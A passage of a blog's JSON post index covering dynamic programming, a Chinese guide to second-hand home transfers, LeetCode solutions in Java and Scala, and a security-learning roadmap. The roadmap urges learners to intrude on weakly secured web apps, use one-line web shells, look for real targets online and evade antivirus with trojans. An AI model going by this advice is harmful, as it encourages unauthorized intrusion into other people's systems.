是没有用的,因为如果不再需要它们,则没有点存储解决方案。例如,二进制搜索没有常见的子问题。我们以上边的递归程序为例,有许多子问题一次又一次地被解决。当 n=5 时可以看到递归程序的结构 123456789 f(5) / \\ f(4) f(3) / \\ / \\ f(3) f(2) f(2) f(1) / \\ / \\ / \\ f(2) f(1) f(1) f(0) f(1) f(0) / \\f(1) f(0) 我们可以看到函数 f(3)被调用了 2 次。如果我们存储了 f(3)的值,那么我们可以重新使用旧的存储值,而不是再次计算它。有两种不同的方法来存储值,以便可以重用这些值： 自上而下 自下而上 自上而下针对该问题的自上而下程序类似于递归版本,只有一个小修改,它在计算解决方案之前会查找查找表。我们初始化一个查找数组,所有初始值都为 NIL。每当我们需要子问题的解决方案时,我们首先查看查找表。如果预先计算的值在那里,那么我们返回该值,否则,我们计算该值并将结果放在查找表中,以便以后可以重用它。 123456789101112131415161718192021222324252627282930313233343536373839/* Java program for Memoized version */public class Fibonacci&#123;final int MAX = 100;final int NIL = -1;int lookup[] = new int[MAX];/* Function to initialize NIL values in lookup table */void _initialize()&#123; for (int i = 0; i &lt; MAX; i++) lookup[i] = NIL;&#125;/* function for nth Fibonacci number */int f(int n)&#123; if (lookup[n] == NIL) &#123; if (n &lt;= 1) lookup[n] = n; else lookup[n] = f(n-1) + f(n-2); &#125; return lookup[n];&#125;public static void main(String[] args)&#123; Fibonacci f = new Fibonacci(); int n = 40; f._initialize(); System.out.println(\"Fibonacci number is\" + \" \" + f.f(n));&#125;&#125;// This Code is Contributed by Saket Kumar 自下而上给定问题的列表程序以自下而上的方式构建表,并返回表中的最后一个条目。例如,对于相同的斐波纳契数,我们首先计算 f(0)然后计算 f(1)然后计算 f(2)然后计算 fib(3),依此类推。从字面上看,我们正在建立自下而上的子问题解决方案。 12345678910111213141516171819202122/* Java program for Tabulated version */public class Fibonacci&#123;int fib(int n)&#123; int f[] = new int[n+1]; f[0] = 0; f[1] = 1; for (int i = 2; i &lt;= n; i++) f[i] = f[i-1] + f[i-2]; return f[n];&#125;public static void main(String[] args)&#123; Fibonacci f = new Fibonacci(); int n = 9; System.out.println(\"Fibonacci number is\" + \" \" + f.fib(n));&#125;&#125;// This Code is Contributed by Saket Kumar 就是咱们程序里用的方法. 这里以公共子问题来引入了 DP,还有其他很多场景会使用 DP,比如:公共子树、最长公共序列等。 怎么解决 DP 相关问题 先求解出第一种解决方案 分析这个方案 找出公共子问题 换方案实现 参考资料 Dynamic programming(wiki) Dynamic Programming(geeksforgeeks) Bellman equation Longest common subsequence problem","updated":"2020-07-19T00:23:28.047Z","tags":[{"name":"DP","slug":"DP","permalink":"http://xwolf191.github.io/tags/DP/"}]},{"title":"二手房交易(过户)要注意什么？","date":"2019-05-17T02:45:00.000Z","path":"2019/05/17/杂侃/二手房交易注意事项/","text":"购买二手房需要大家引起注意，因为二手房一般是经过其他人居住过一段时间的房屋，而对于之前居住的问题我们并不是很了解，因此很容易在购买之后出现问题，那么在二手房的交接以及交房验收的过程中我们一定要引起重视。接下来小编为大家介绍二手房过户要注意什么。 1、二手房设施设备清点由于二手房一般都被原房东装修和使用过，在二手房出售时对装修和一些设备设施通常都是赠送的，因此，二手房买房人在签订房屋买卖合同时，就应将设备设施的品牌、成色以及能否正常使用予以明确写明，二手房交接房屋时按照合同约定进行清点、验收。这些设备设施一般有：空调、灶具、抽油烟机、热水器、灯具等。收取发票保修卡。 2、水、电、煤气、天然气的清点及过户双方应一同来到自来水公司、电力公司、煤气公司、天然气公司的营业网点办理相应的过户手续，并向工作人员询问原房东有无欠费情况。如有欠费，二手房买房人则有权要求原房东补交费用。然后，双方再根据最后一期缴费单据上载明的数字和房屋表具上的差额，根据单价进行结算。作为二手房买房人，要特别注意在办理过户手续时一定要向工作人员询问原房东的欠费情况，这些欠费可能是原房东以前拖欠的费用及滞纳金(滞纳金一般按照日千分之三计算，累积起来就相当高了)。 3、有线电视、数字电视、电话、宽带的过户二手房买卖双方应一同来到有线电视公司、电信或网通的营业网点办理过户手续，同时，二手房买房人也要特别注意询问工作人员原房东有无拖欠费用的情况。 4、物业服务费、公共维修基金、取暖费结清二手房买卖双方应一同来到物业公司办理物业和公共维修基金更名手续，同时办理物业费用缴纳的交接，要注意询问物业人员看原房东是否拖欠物业费及取暖费。 5、户口迁移二手房买卖双方应一同来到房屋所在地的派出所，询问房屋内的户口情况，原房东应将户口全部迁出，如仍有户口，买房人可要求原房东迁出，若其拒绝办理，可追究其违约责任。 6、清点二手房钥匙二手房原房东交给下家的钥匙包括：二手房房间钥匙、单元大门钥匙、防盗门钥匙、地下室或小房钥匙、信箱钥匙等。 7、结清二手房尾款以上六项均二手房过户及结算完毕后，将房屋买卖合同约定的尾款在扣除下家代原房东支付的费用后，余额为下家实际应支付的款项。上加收款后应出具收条并注明“全部房款已结清”字样。 8、签署《房屋交接书》《房屋交接书》应将上述 7 各方面的内容以文字的形式固定下来，双方签字、捺手印，一式两份，双方各执一份。签署《房屋交接书》的法律意义在于证明原房东将符合合同约定的房屋交付给买房人，交房的时间点也就是签署《房屋交接书》的时间点。如果不签，二手房买卖双方将来可能会对何时才算是交房时间产生争议，进而影响到双方违约责任的承担。如果在还没有办理完上述 7 个方面的手续就签署，则意味着买房人未验收就已经认可房屋符合合同约定。因此，签署《房屋交接书》是二手房交房手续的最后一道程序，不能先签署再验收。如果在对房屋验收时发现某些方面不符合合同的约定，应将问题写在二手房房屋交接书上面，予以注明、说明，为将来追究二手房原房东的责任做好证据上的准备。 9、质量问题细排查由于二手房一般已有一定的历史，故买家在收房时，还应特别注意查看房屋的工程质量问题。例如，门、窗是否密封，有无破损；天花板、墙壁、地面，有无裂痕、渗漏、积水等；水、电、开关等，能否正常使用，用水通道是否畅通等等。如果所买的房子是顶层，还要查看顶面是否有雨水渗漏的痕迹。 10、收楼证明备齐全对于一些多年未入住的新楼，买家收楼时要检查验收楼盘交付使用的各种证件是否齐备。同时，对于一些所谓的收楼费用，例如维修基金等，也必须清晰地知道业主是否曾缴交过，以免造成自己的损失。 二手房交易注意事项一、产权清晰产权证上的房主与卖房者是否一致；搞清楚所卖房屋的性质；产权证上所确认的面积与实际面积是否相符；验证产权证的合法性与真实性。其次，要判断其房产有没有抵押，包括私下抵押、共有人等。以避免在过户后出现不必要的争议与纠纷。 二、房屋质量观察房屋的结构，建筑与装修材料。看房屋的内外部结构是否被改动过；是否有私建部分；是否有占用走廊或阳台等；牵涉到阳台的面积怎么算的问题。 三、居住空间观察房屋的内部结构是否合理；是否适合居住；活动空间大小等。 四、装修配置看原房屋装修的水平、程度如何；确认房子的供电设施、供气管道、水管等是否有老化现象；电话线、宽带的安装是否完备等。 五、物业管理了解该区水、电、煤、暖的价格及缴费方式，是上门代收还是自己去缴；观察电梯是否可以正常使用；了解该区的停车场、小区绿化的基本情况； 六、房屋历史了解该房是哪年盖的，还用多久的土地使用期限；有哪些人住过，有什么用途，房屋与住客是否曾发生过意外事故；还有原住户在当地的信用情况；是否有欠交物业费、水电费等。 七、房屋价值通过对市场上的功放的反复比较判断房屋的价值；委托信得过的中介公司进行价值评估；银行提供按揭时会作出价值评估，这个价格可以看成房屋的最低保值价。 八、产权交接需要找个双方都信得过的单位，如信誉较好的担保公司，等过户完成后再将房款转入卖方账户。 除过以上问题，在二手房交易流程结束后，还有以下几个容易被忽略的小问题需要注意： 1、看清交房清单 2、检查单位室内各项设施是否有质量问题 3、收楼证明是否齐全 4、户籍是否迁出 5、发票是否齐全。 6、结清水表账单，告知电表情况 7、天然气过户 8、结清网费和电话费 9、协助有线电视过户 二手房过户注意事项二手房过户容易产生产权、租赁、违约规定等纠纷，购房者在办理过户的时候需要谨慎办理。 1、若要办理委托过户办理。需要由委托人出具委托书或公证书，被委托人携带委托书或公证书、个人身份证原件及复印件才能办理过户； 2、如果房屋已经出租，购房者办理过户必须要求卖方提供房屋承租人出具放弃优先购买权的证明； 3、如果房屋有共有权人，购房者应该要求卖方出具共有权人同意出售的证明和其所持有的共有权证书，或者共有权人到场签合同、办理过户； 参考资料 二手房过户要注意什么？","updated":"2020-07-19T00:23:28.411Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"},{"name":"房产","slug":"房产","permalink":"http://xwolf191.github.io/tags/房产/"}]},{"title":"371. Sum of Two Integers","date":"2019-05-16T11:25:00.000Z","path":"2019/05/16/数据结构和算法/leetcode/Sum of Two Integers/","text":"Calculate the sum of two integers a and b, but you are not allowed to use the operator + and -. Example 1: 12Input: a = 1, b = 2Output: 3 -Example 2: 12Input: a = -2, b = 3Output: 1 题意不用 +，-运算符计算两个 int 值的和. 实现 java 递归位运算 123public int getSum(int a, int b) &#123; return (b == 0) ? a : getSum(a ^ b, (a &amp; b) &lt;&lt; 1); &#125; 参考资料 sum-of-two-integers","updated":"2020-07-19T00:23:28.039Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"10. Regular Expression Matching","date":"2019-05-16T09:25:00.000Z","path":"2019/05/16/数据结构和算法/leetcode/Regular Expression Matching/","text":"Given an input string (s) and a pattern (p), implement regular expression matching with support for ‘.’ and ‘*‘. 123&apos;.&apos; Matches any single character.&apos;\\*&apos; Matches zero or more of the preceding element.The matching should cover the entire input string (not partial). Note: s could be empty and contains only lowercase letters a-z. p could be empty and contains only lowercase letters a-z, and characters like . or *. Example 1: 12345Input:s = &quot;aa&quot;p = &quot;a&quot;Output: falseExplanation: &quot;a&quot; does not match the entire string &quot;aa&quot;. Example 2: 12345Input:s = &quot;aa&quot;p = &quot;a*&quot;Output: trueExplanation: &apos;*&apos; means zero or more of the precedeng element, &apos;a&apos;. Therefore, by repeating &apos;a&apos; once, it becomes &quot;aa&quot;. Example 3: 12345Input:s = &quot;ab&quot;p = &quot;.*&quot;Output: trueExplanation: &quot;.*&quot; means &quot;zero or more (*) of any character (.)&quot;. Example 4: 12345Input:s = &quot;aab&quot;p = &quot;c*a*b&quot;Output: trueExplanation: c can be repeated 0 times, a can be repeated 1 time. Therefore it matches &quot;aab&quot;. Example 5: 1234Input:s = &quot;mississippi&quot;p = &quot;mis*is*p*.&quot;Output: false 题意正则匹配 实现 java 动态规划 123456789101112131415161718192021222324252627282930313233343536/** * 动态规划 * @param s * @param p * @return */ public boolean isMatch(String s, String p)&#123; if (s == null || p == null) &#123; return false; &#125; boolean[][] dp = new boolean[s.length()+1][p.length()+1]; dp[0][0] = true; for (int i = 0; i &lt; p.length(); i++) &#123; if (p.charAt(i) == '*' &amp;&amp; dp[0][i-1]) &#123; dp[0][i+1] = true; &#125; &#125; for (int i = 0 ; i &lt; s.length(); i++) &#123; for (int j = 0; j &lt; p.length(); j++) &#123; if (p.charAt(j) == '.') &#123; dp[i+1][j+1] = dp[i][j]; &#125; if (p.charAt(j) == s.charAt(i)) &#123; dp[i+1][j+1] = dp[i][j]; &#125; if (p.charAt(j) == '*') &#123; if (p.charAt(j-1) != s.charAt(i) &amp;&amp; p.charAt(j-1) != '.') &#123; dp[i+1][j+1] = dp[i+1][j-1]; &#125; else &#123; dp[i+1][j+1] = (dp[i+1][j] || dp[i][j+1] || dp[i+1][j-1]); &#125; &#125; &#125; &#125; return dp[s.length()][p.length()]; &#125; 参考资料 regular-expression-matching","updated":"2020-07-19T00:23:28.034Z","tags":[{"name":"DP","slug":"DP","permalink":"http://xwolf191.github.io/tags/DP/"},{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"安全技术学习入门技能图","date":"2019-05-16T02:20:00.000Z","path":"2019/05/16/security/安全技术学习入门技能图/","text":"最近西电信安协会的技能轴更新了，这是老版的，我觉得更接地气.注意，这十五个知识快可以组成几条不同的学习链路，然后基本上涵盖了信安主流的各个技术方向。当然知识体系不全，比如没提到 PHP和 MySQL。但是注意学习周期，比如 1 的基本常识，上边有个日期“January 1, 2013 — January 15, 2013”，算下来就是 15 天的学习周期。这个周期是西电的同学针对无基础，有大量课程的本科生指定的，咱们虽然也有实验室任务，但起码要折半吧。在信息安全人才如此急缺的情况下，扎实的计算机、网络综合基础知识是前提，安全素质才是我们的核心竞争力。 1、计算机基本常识January 1, 2013 — January 15, 2013 计算机基本常识了解计算机基本常识，常用软件使用。需要学会基本使用的软件或技术有：Word、VMware、VPN、Visual Studio、FireFox 及其插件、一款编辑器，学会如何截图、编译运行程序、使用 Google 查询资料、邮件列表加入与收发。 2、C 语言基础February 1, 2013 — June 1, 2013 C 语言基础学习基础的 C 语言，不管是否是编程方向，我觉得都有必要了解一些 C 语言，会编写简单的 C 程序代码。推荐的入门书籍有：谭浩强《C 程序设计》、《C 和指针》C 语言对于初入门的同学来说是一座大山，但一旦翻过了这座大山，前面将会是一马平川。如果想深入研究 C 语言，《C 和指针》这本书将是你最好的选择。 3、数据结构April 1, 2013 — June 1, 2013 数据结构开发方向的同学必学，其他方向的同学也可以适当了解。在 C 语言学习到一定阶段后，可以开始了解数据结构，它和 C 语言相辅相成，可以说在我们学习 C 语言的后期，很好的对我们 C 语言知识进行了整理。当学习完成数据结构后就可以写一些 ACM 的竞赛题目了。推荐郝斌老师的数据结构教学视频。 4、Web 安全基础March 1, 2013 — May 1, 2013 web 安全基础了解 web 应用的各种常见漏洞（知道是什么，如何形成）：SQL 注入、XSS、CSRF、上传漏洞、解析漏洞、任意文件包含漏洞、点击劫持、弱口令、cookie 欺骗等，会使用一些常用入侵检测工具和辅助工具，并入侵一些安全系数较低的 web 应用。了解关于 web 安全的周边知识，如：能判断某密码的 hash 类型、能识别一些常用的 web 指纹、能在互联网上搜索目标相关信息、了解一句话木马并会利用等等。 5、常用 Windows 命令March 20, 2013 — March 31, 2013 常用 Windows 命令做渗透的同学，尤其需要首先学习一些常用的 windows 命令(最好在实战中边运用边练习)，特别是入侵检测是常用命令，如 netuser、net localgroup、net use、net share、net start、arp、whoami、regedit、tasklist、find、cp、mkdir、del、dir、print……提高：能写一些批处理脚本，完成一些重复性任务 6、一门脚本语言July 15, 2013 — October 1, 2013 一门脚本语言对于做渗透测试方向的同学尤为重要，对于做开发的同学也可以学习一门脚本语言。我推荐的是 python 或 php，学习 python 可以快速开发出一些有针对性的脚本，而学习 php 可以尝试进行 web 漏洞的挖掘。 7、Linux 使用August 1, 2013 — December 1, 2013 Linux 使用学习渗透的同学在这段时间又能分为两条路，一是 web 安全，二是内网渗透。web 安全偏重于 web 应用漏洞挖掘和利用，内网渗透偏重于网络环境的分析、内网计算机的漏洞利用。内网中大部分重要计算机属于 Linux，所以学会 Linux 基础的使用，Linux 各种服务的搭建、维护、漏洞利用修补是必须的。推荐图书：《鸟哥的 Linux 私房菜》 8、Windows 编程April 15, 2013 — December 31, 2013 Windows 编程在数据结构学习完成之后，我觉得就是一个分水岭了。做渗透方向的就不必继续深入 Windows 编程，大可继续积累网络安全经验，但开发、逆向的同学就需要学习 windows 编程了。Windows 编程无非就是阅读 MSDN，熟悉每个 windowsAPI 的用法，平时想到的好点子可以尝试写成程序，增加自己的代码量积累。windows 编程也是一个积累的过程，需要慢慢了解每个 API，所以学习起来并不紧张。 9、Web 安全积累期May 1, 2013 — December 31, 2014 web 安全积累期其实积累是一个长期的过程，所以也不分期限的。平时可以在如 90、法客、土司、乌云、习科之类的安全社区和大家一起讨论，多关注最新的技术、漏洞，平时注意搜集每个漏洞的成因、利用方法、修补方法，并尝试在网上寻找实战的机会。这段时间还可以学点脚本语言，当掌握了一门顺手的脚本语言后就能更快速、更便捷地做很多针对性的攻击。 10、汇编语言June 1, 2013 — September 1, 2013 汇编语言汇编也是一门基础课程，对以后的逆向破解、漏洞挖掘、木马免杀的学习都有直接影响，在 windows 编程的学习期间可以开始学习汇编。大概了解 16 位的汇编语言，知道基本语法，重点在 32 位汇编的学习上。学习汇编语言可以结合自己写的 C 程序，将自己写好的程序调试，单步调试每一句汇编语言，不懂就查。 11、逆向破解July 1, 2013 — October 1, 2013 逆向破解在汇编基本语法学习完毕后，可以选择性地开始学习逆向、破解相关操作。在学习逆向的过程中就可以熟悉之前学习的汇编指令的使用推荐图书：《加密与解密》 12、木马免杀September 20, 2013 — March 1, 2014 木马免杀在逆向学习完成后，又可以分为几个小方向：深入破解、exploit、木马免杀。能够自己编写木马后，最需要的就是免杀。如果编写的病毒木马不能运行，也无济于事。免杀成功与否是运气、经验、灵感、技术、耐心的集合体，缺一不可。所以虽然很多人尝试学习，但最后真正能做到完美的人并不多推荐图书：《黑客免杀攻防》 13、网络环境利用与 Win 服务器October 15, 2013 — February 1, 2014 网络环境利用与 win 服务器在 Linux 基础学习到一定程度后，可以开始学习网络，如何利用内网内各种计算机开启的各种服务，来达到渗透进目标机器的目的。当然，同时也要学习 Windows 服务器的使用，了解什么是域，如何在 windows 环境下使用各种服务。因为一个大内网下一般个人机、目标机是 windows 系统。 14、Exploit 二进制漏洞October 5, 2013 — April 1, 2014 Exploit 二进制漏洞在逆向学习完成后，又可以分为几个小方向：深入破解、exploit、木马免杀。其中 Exploit 对技术要求较高，回报也最丰厚，所以是很多大牛集结之地。学习 exp 需要对 C、C++有牢固的基础，并有一双发现问题的眼睛。在他人眼中可能只是一个软件崩溃或错误信息，在 exper 眼里就可以是无穷无尽的财富。 15、Windows 核心编程November 1, 2013 — May 1, 2014 Windows 核心编程在 Windows 编程学习到一定程度后就可以开始核心编程，其实二者并无太大区别，只是核心编程更加偏重 windows 内核的一些机制。当你的技术不仅限于开发桌面应用以后，木马、病毒这些更接近系统底层的东西既可以满足要求。这本书对于以后做开发的同学必看不可：《Windows 核心编程》、《天方夜谭》、《寒江独钓》 技能图谱 参考资料 安全圈 知道创宇研发技能表 v3.1","updated":"2020-07-19T00:23:27.926Z","tags":[{"name":"security","slug":"security","permalink":"http://xwolf191.github.io/tags/security/"}]},{"title":"415. Add Strings","date":"2019-05-15T07:15:00.000Z","path":"2019/05/15/数据结构和算法/leetcode/Add Strings/","text":"Given two non-negative integers num1 and num2 represented as string, return the sum of num1 and num2. Note: The length of both num1 and num2 is &lt; 5100. Both num1 and num2 contains only digits 0-9. Both num1 and num2 does not contain any leading zero. You must not use any built-in BigInteger library or convert the inputs to integer directly. 题意不使用内置 Int 类库，完成字符串的相加。 实现 java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public String addStrings(String num1, String num2) &#123; if(num1 == null || num1.length() == 0) &#123; return num2; &#125; if(num2 == null || num2.length() == 0) &#123; return num1; &#125; char[] chAry = num1.toCharArray(); Stack&lt;Character&gt; aSk = new Stack&lt;&gt;(); for(Character a: chAry) &#123; aSk.add(a); &#125; char[] chBry = num2.toCharArray(); Stack&lt;Character&gt; bSk = new Stack&lt;&gt;(); for(Character b: chBry) &#123; bSk.add(b); &#125; int aLen = num1.length(); int bLen = num2.length(); List&lt;Integer&gt; result = new ArrayList&lt;&gt;(); int temp = 0; while (!aSk.isEmpty() || !bSk.isEmpty()) &#123; char a = '0'; if(!aSk.isEmpty()) &#123; a = aSk.pop(); &#125; char b = '0'; if(!bSk.isEmpty()) &#123; b = bSk.pop(); &#125; int res = a + b - 96 + temp; if (res &gt;= 10)&#123; temp = 1; res = res - 10; &#125; else &#123; temp = 0; &#125; result.add(res); &#125; StringBuilder build = new StringBuilder(); int size = result.size(); // the first two char's sum if &gt; 10 if (temp == 1)&#123; build.append(1); &#125; for (int i= size - 1 ; i &gt;= 0 ; i--)&#123; build.append(result.get(i)); &#125; return build.toString(); &#125; 讨论区其他答案 java 1234567891011public String addStrings(String num1, String num2) &#123; StringBuilder sb = new StringBuilder(); int carry = 0; for(int i = num1.length() - 1, j = num2.length() - 1; i &gt;= 0 || j &gt;= 0 || carry == 1; i--, j--)&#123; int x = i &lt; 0 ? 0 : num1.charAt(i) - '0'; int y = j &lt; 0 ? 0 : num2.charAt(j) - '0'; sb.append((x + y + carry) % 10); carry = (x + y + carry) / 10; &#125; return sb.reverse().toString(); &#125; 参考资料 add-strings","updated":"2020-07-19T00:23:28.020Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"225. Implement Stack using Queues","date":"2019-05-15T02:50:00.000Z","path":"2019/05/15/数据结构和算法/leetcode/Implement Stack using Queues/","text":"Implement the following operations of a stack using queues. push(x) — Push element x onto stack. pop() — Removes the element on top of the stack. top() — Get the top element. empty() — Return whether the stack is empty. Example: 1234567MyStack stack = new MyStack();stack.push(1);stack.push(2);stack.top(); // returns 2stack.pop(); // returns 2stack.empty(); // returns false Notes: You must use only standard operations of a queue — which means only push to back, peek/pop from front, size, and is empty operations are valid. Depending on your language, queue may not be supported natively. You may simulate a queue by using a list or deque (double-ended queue), as long as you use only standard operations of a queue. You may assume that all operations are valid (for example, no pop or top operations will be called on an empty stack). 实现 java 双端队列. 1234567891011121314151617181920212223242526272829class MyStack &#123; ArrayDeque&lt;Integer&gt; queue; /** Initialize your data structure here. */ public MyStack() &#123; queue = new ArrayDeque&lt;&gt;(); &#125; /** Push element x onto stack. */ public void push(int x) &#123; queue.add(x); &#125; /** Removes the element on top of the stack and returns that element. */ public int pop() &#123; return queue.removeLast(); &#125; /** Get the top element. */ public int top() &#123; return queue.getLast(); &#125; /** Returns whether the stack is empty. */ public boolean empty() &#123; return queue.isEmpty(); &#125; &#125; java 单向队列. 12345678910111213141516171819202122232425262728293031323334353637class MyStack&#123; Queue&lt;Integer&gt; queue; public MyStack() &#123; this.queue=new LinkedList&lt;Integer&gt;(); &#125; // Push element x onto stack. public void push(int x) &#123; queue.add(x); for(int i=0;i&lt;queue.size()-1;i++) &#123; queue.add(queue.poll()); &#125; &#125; // Removes the element on top of the stack. public int pop() &#123; return queue.poll(); &#125; // Get the top element. public int top() &#123; return queue.peek(); &#125; // Return whether the stack is empty. public boolean empty() &#123; return queue.isEmpty(); &#125;&#125; 参考 implement-stack-using-queues","updated":"2020-07-19T00:23:28.028Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"stack","slug":"stack","permalink":"http://xwolf191.github.io/tags/stack/"}]},{"title":"232. Implement Queue using Stacks","date":"2019-05-15T02:15:00.000Z","path":"2019/05/15/数据结构和算法/leetcode/Implement Queue using Stacks/","text":"Implement the following operations of a queue using stacks. push(x) — Push element x to the back of queue. pop() — Removes the element from in front of queue. peek() — Get the front element. empty() — Return whether the queue is empty. Example: 1234567MyQueue queue = new MyQueue();queue.push(1);queue.push(2);queue.peek(); // returns 1queue.pop(); // returns 1queue.empty(); // returns false Notes: You must use only standard operations of a stack — which means only push to top, peek/pop from top, size, and is empty operations are valid. Depending on your language, stack may not be supported natively. You may simulate a stack by using a list or deque (double-ended queue), as long as you use only standard operations of a stack. You may assume that all operations are valid (for example, no pop or peek operations will be called on an empty queue). 题意利用栈来实现队列的功能. 实现 java 因为 java 的 Stack 集成了 Vector,利用现有的 api 即可实现基本的队列功能. 1234567891011121314151617181920212223242526272829303132class MyQueue &#123; private Stack&lt;Integer&gt; stack; /** Initialize your data structure here. */ public MyQueue() &#123; stack = new Stack&lt;&gt;(); &#125; /** Push element x to the back of queue. */ public void push(int x) &#123; stack.add(x); &#125; /** Removes the element from in front of queue and returns that element. */ public int pop() &#123; if (!empty())&#123; return stack.remove(0); &#125; return -1; &#125; /** Get the front element. */ public int peek() &#123; return stack.firstElement(); &#125; /** Returns whether the queue is empty. */ public boolean empty() &#123; return stack.isEmpty(); &#125; &#125; java 利用两个栈来处理入队和出队的问题. 1234567891011121314151617181920212223242526class MyQueue &#123; Stack&lt;Integer&gt; input = new Stack(); Stack&lt;Integer&gt; output = new Stack(); public void push(int x) &#123; input.push(x); &#125; public int pop() &#123; peek(); return output.pop(); &#125; public int peek() &#123; if (output.empty())&#123; while (!input.empty())&#123; output.push(input.pop()); &#125; &#125; return output.peek(); &#125; public boolean empty() &#123; return input.empty() &amp;&amp; output.empty(); &#125;&#125; 参考 implement-queue-using-stacks","updated":"2020-07-19T00:23:28.027Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"stack","slug":"stack","permalink":"http://xwolf191.github.io/tags/stack/"}]},{"title":"859. Buddy Strings","date":"2019-05-14T15:10:00.000Z","path":"2019/05/14/数据结构和算法/leetcode/Buddy Strings/","text":"Given two strings A and B of lowercase letters, return true if and only if we can swap two letters in A so that the result equals B. Example 1: 12Input: A = &quot;ab&quot;, B = &quot;ba&quot;Output: true Example 2: 12Input: A = &quot;ab&quot;, B = &quot;ab&quot;Output: false Example 3: 12Input: A = &quot;aa&quot;, B = &quot;aa&quot;Output: true Example 4: 12Input: A = &quot;aaaaaaabc&quot;, B = &quot;aaaaaaacb&quot;Output: true Example 5: 12Input: A = &quot;&quot;, B = &quot;aa&quot;Output: false Note: 0 &lt;= A.length &lt;= 20000 0 &lt;= B.length &lt;= 20000 A and B consist only of lowercase letters. 题意交换A字符串的两个字符，使得 A = B. 实现 java 12345678910111213141516171819202122232425262728293031323334353637public boolean buddyStrings(String A, String B) &#123; if (A.length() != B.length() ) &#123; return false; &#125; if (A.length() &lt; 2 || B.length() &lt; 2)&#123; return false; &#125; int len = A.length(); char[] chA = A.toCharArray(); char[] chB = B.toCharArray(); int modCount = 0; char[] ele = new char[4]; Set&lt;Character&gt; keySet = new HashSet&lt;&gt;(); for (int i = 0; i &lt; len; i++) &#123; char a = chA[i]; char b = chB[i]; keySet.add(a); if (modCount &gt; 2)&#123; return false; &#125; if (a != b) &#123; modCount += 1; if (ele[0] == '\\u0000')&#123; ele[0] = a; ele[1] = b; &#125; else &#123; ele[2] = a; ele[3] = b; &#125; &#125; &#125; if (modCount == 0)&#123; return keySet.size() &lt; chA.length; &#125; return ele[0] == ele[3] &amp;&amp; ele[1] == ele[2]; &#125; 讨论区其他答案 12345678910111213141516public boolean buddyStrings(String A, String B) &#123; if (A.length() != B.length())&#123; return false; &#125; if (A.equals(B)) &#123; Set&lt;Character&gt; s = new HashSet&lt;Character&gt;(); for (char c : A.toCharArray()) &#123; s.add(c); &#125; return s.size() &lt; A.length(); &#125; List&lt;Integer&gt; dif = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; A.length(); ++i) if (A.charAt(i) != B.charAt(i)) dif.add(i); return dif.size() == 2 &amp;&amp; A.charAt(dif.get(0)) == B.charAt(dif.get(1)) &amp;&amp; A.charAt(dif.get(1)) == B.charAt(dif.get(0)); &#125; 参考资料 buddy-strings","updated":"2020-07-19T00:23:28.024Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"20. Valid Parentheses","date":"2019-05-14T09:20:00.000Z","path":"2019/05/14/数据结构和算法/leetcode/Valid Parentheses/","text":"Given a string containing just the characters ‘(‘, ‘)’, ‘{‘, ‘}’, ‘[‘ and ‘]’, determine if the input string is valid. An input string is valid if: Open brackets must be closed by the same type of brackets.Open brackets must be closed in the correct order.Note that an empty string is also considered valid. Example 1: 12Input: &quot;()&quot;Output: true Example 2: 12Input: &quot;()[]&#123;&#125;&quot;Output: true Example 3: 12Input: &quot;(]&quot;Output: false Example 4: 12Input: &quot;([)]&quot;Output: false Example 5: 12Input: &quot;&#123;[]&#125;&quot;Output: true 题意判断是否串是否以给定的字符成对出现. 实现 java 利用栈，遍历字符串,判断存在左括号则入栈右括号,否则则出栈. 12345678910111213141516public boolean isValid(String s) &#123; Stack&lt;Character&gt; stack = new Stack&lt;&gt;(); char[] chars = s.toCharArray(); for (char c : chars)&#123; if ( c == '(') &#123; stack.push(')'); &#125; else if ( c == '[') &#123; stack.push(']'); &#125; else if ( c == '&#123;') &#123; stack.push('&#125;'); &#125;else if (stack.isEmpty() || stack.pop()!= c)&#123; return false; &#125; &#125; return stack.isEmpty(); &#125; scala 正则表达式替换给定字符 12345678910def isValid(s: String): Boolean = &#123; var res = s while (res.contains(\"()\") || res.contains(\"&#123;&#125;\") || res.contains(\"[]\") ) &#123; res = res.replaceAll(\"\\\\(\\\\)\",\"\") res = res.replaceAll(\"\\\\&#123;\\\\&#125;\",\"\") res = res.replaceAll(\"\\\\[\\\\]\",\"\") &#125; res.equals(\"\")&#125; 参考资料 valid-parentheses","updated":"2020-07-19T00:23:28.043Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"stack","slug":"stack","permalink":"http://xwolf191.github.io/tags/stack/"}]},{"title":"155. Min Stack","date":"2019-05-14T03:40:00.000Z","path":"2019/05/14/数据结构和算法/leetcode/Min Stack/","text":"Design a stack that supports push, pop, top, and retrieving the minimum element in constant time. push(x) — Push element x onto stack. pop() — Removes the element on top of the stack. top() — Get the top element. getMin() — Retrieve the minimum element in the stack. Example: 12345678MinStack minStack = new MinStack();minStack.push(-2);minStack.push(0);minStack.push(-3);minStack.getMin(); --&gt; Returns -3.minStack.pop();minStack.top(); --&gt; Returns 0.minStack.getMin(); --&gt; Returns -2. 题意设计一个栈，支持 push/pop/top/getMin 这几种操作。最重要的就是获取栈中最小值的操作。要求在 O(1)内求出改值. 实现 java 最容易想到的方法,但是求最小值需要排序来取,时间复杂度不为 O(1) 12345678910111213141516171819202122232425public class MinStack &#123; private Stack&lt;Integer&gt; stack; /** initialize your data structure here. */ public MinStack() &#123; stack = new Stack&lt;&gt;(); &#125; public void push(int x) &#123; stack.push(x); &#125; public void pop() &#123; stack.pop(); &#125; public int top() &#123; return stack.lastElement(); &#125; public int getMin() &#123; return stack.stream().sorted().findFirst().get(); &#125;&#125; java O(1)复杂度的解决方法,push 的时候判断当前元素 x 是否小于最小值 min,如果 x &lt;= min,则令 min = x 同时 push min , x。 pop 操作如果出栈的元素 p==min,则在 pop 一次,让上次 push 的元素出栈. 